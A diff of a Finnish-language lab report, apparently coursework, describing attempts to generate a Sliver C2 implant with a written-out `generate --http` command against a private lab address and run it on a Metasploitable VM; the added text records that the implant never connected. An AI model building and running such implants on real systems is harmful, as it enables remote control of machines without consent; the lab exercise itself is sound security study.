@@ -234,6 +234,8 @@ generate --http 192.168.56.101:80 --os linux --arch x86 --save payload.elf
 - `--arch x86` Prosessorin arkkitehtuuri.
 - `--save payload.elf` Implantti tallennetaan tällä nimellä.
 
+![](h6/sliver%20ilmplant1.png)
+
 Implantin kääntämisessä meni todella kauan ja pelkäsin jo pariin otteeseen että virtuaalikoneeni crashaa, mutta tulihan se valmiiksi lopulta.
 
 Avasin tarvittavat portit 
@@ -250,7 +252,17 @@ Laitoin http listenerin päälle ja ajoin implantin, mutta mitään ei tapahtunt
 
 ![](h6/sliver%20fail.png)
 
+Yritin vielä luoda uuden implantin jossa --arch oli 386 ja --save ei ollut määritelty mitään, mutta tämäkään ei tuottanut tulosta.
 
+![](h6/sliver%20implant2.png)
+
+Tarkistin, että apache2 tai nginx ei ole päällä ja käytössä portissa 80. Tarkistin myös, että metasploitablesta saa yhteyden porttiin 80.
+
+![](h6/ports.png)
+![](h6/nc_metasploitable.png)
+
+Vaikka koitin useamman kerran ajaa implanttia metasploitablella, niin mikään ei auttanut.
+![](h6/no_connection.png)
 
 
 ## Lähteet
